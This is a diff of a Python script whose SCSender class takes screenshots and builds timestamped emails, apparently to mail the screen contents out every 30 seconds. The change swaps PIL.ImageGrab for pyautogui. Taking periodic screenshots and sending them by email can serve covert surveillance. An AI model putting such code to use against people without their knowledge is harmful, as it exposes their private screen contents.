@@ -9,7 +9,7 @@
 
 
 
-import sys, smtplib, PIL.ImageGrab, time
+import sys, smtplib, pyautogui, time
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
@@ -25,8 +25,7 @@ delay = 30                          #delay between sending emails in seconds
 class SCSender:
     #make image0.png
     def make_screenshot(self):
-        image0 = PIL.ImageGrab.grab()
-        image0.save('image0.png')
+        pyautogui.screenshot('image0.png')
     #make email
     def make_email(self):
         self.date = time.strftime("%Y-%m-%d; %H:%M:%S;", time.localtime())
